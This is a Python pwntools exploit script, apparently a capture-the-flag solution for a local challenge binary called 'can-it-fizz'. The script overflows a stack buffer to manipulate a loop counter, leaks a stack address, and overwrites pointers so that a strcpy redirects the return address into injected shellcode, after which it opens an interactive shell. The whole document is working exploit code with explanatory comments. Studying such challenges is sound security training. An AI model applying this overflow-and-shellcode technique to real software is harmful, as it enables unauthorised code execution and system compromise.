from pwn import *

p = process("/challenge/can-it-fizz")

p.recvuntil(b"0:")  # Fixed: bytes literal

first_payload = b"A" * 32               # overwrite the buffer (4 bytes) up to loop counter
# set the loop counter (ustack_24) to negative number -11 to stay in the loop 
# this will make sure the local_20 get the address of local_30 in the next iteration to be -5
first_payload += p32(0xfffffff5)

p.send(first_payload)

output = p.recvuntil("Correct answer: FizzBuzz", timeout=2)
print(f"FIRST OUTPUT: {output}")

print("----------------------------------------------------------------------------------------")

second_payload = b"HI"          # arbitrary data just to go with the next iteration and copy the local_30 + 4 address to local_20 

p.send(second_payload)

p.recvuntil(b"You entered: ", timeout=2)  # Fixed: bytes literal
output = p.recvline()

# Fixed: Handle binary data properly without eval
try:
    result = output.decode('utf-8', errors='ignore').strip()
except:
    result = output #.hex()  # Fallback to hex if decode fails
print(f"SECOND OUTPUT: {output}")

# Fixed: Extract bytes properly and ensure we have enough data
if len(output) >= 42:
    local_30_address_bytes = output[36:42]
    # Fixed: Pad to 8 bytes before converting to 64-bit integer
    local_30_address_value = u64(local_30_address_bytes.ljust(8, b'\x00'))
    print(f"local_30_address ==> local_20 ptr: {hex(local_30_address_value)}")
else:
    print(f"Output too short: {len(output)} bytes")
    local_30_address_value = 0  # Default value

output = p.recvuntil("Correct answer: ", timeout=2)
output2 = p.recvline()
print(output2)

print("----------------------------------------------------------------------------------------")

third_payload = b"B" * 24                               # this include the 4B of buffer + 16B of local_40 and local_38 + 4B first half of local_30
third_payload += p64(local_30_address_value - 0x17)     # the difference between local_30_address and the buffer address is 0x17 (fixed offset) (second half of local_30 + local_28 (4B))
third_payload += p32(0xfffffff5)                        # ustack_24 loop counter (4 bytes) to be -5 in the next iteration to copy the local_30 + 4 address to local_20

p.send(third_payload)

#p.recvuntil("Correct answer: ", timeout=2)
output = p.recvuntil("Correct answer: ", timeout=2)
print(f"THIRD OUTPUT: {output}")
output2 = p.recvline()
print(output2)

print("----------------------------------------------------------------------------------------")

# Build the payload
with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

padding_len = 24 - len(shellcode)

shellcode_payload = shellcode
shellcode_payload += padding_len * b"C"
shellcode_payload += p64(local_30_address_value - 0x17)         # local_30 hold the address of the buffer to jump to
shellcode_payload += p32(0x77777777)                            # the loop counter should be at the edge to break the loop after the last iteration to execute the address
shellcode_payload += p64(local_30_address_value)                # local_20 to be equal the address of local_30 + 4 (already did from previous step but just to fill the gap to read local_18)
shellcode_payload += p64(local_30_address_value + 0x2c)         # local_18 to be equal the address of the return address location 

# the strcpy will copy the address of the buffer to the return address location to jump to execute the shellcode from the buffer

p.send(shellcode_payload)

output = p.recvall(timeout=2)
print(f"LAST OUTPUT: {output}")

p.interactive()
